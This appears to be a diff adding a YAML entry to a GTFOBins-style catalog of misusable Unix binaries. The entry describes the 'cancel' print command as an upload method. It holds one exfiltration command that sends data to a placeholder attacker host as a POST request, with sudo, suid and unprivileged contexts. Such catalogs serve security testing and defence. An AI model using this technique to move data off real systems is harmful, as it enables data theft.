@@ -1,0 +1,13 @@
+---
+functions:
+  upload:
+  - binary: false
+    code: |-
+      cancel -h attacker.com:12345 -u DATA
+    comment: |-
+      Data is sent as a POST request along with other content.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+...
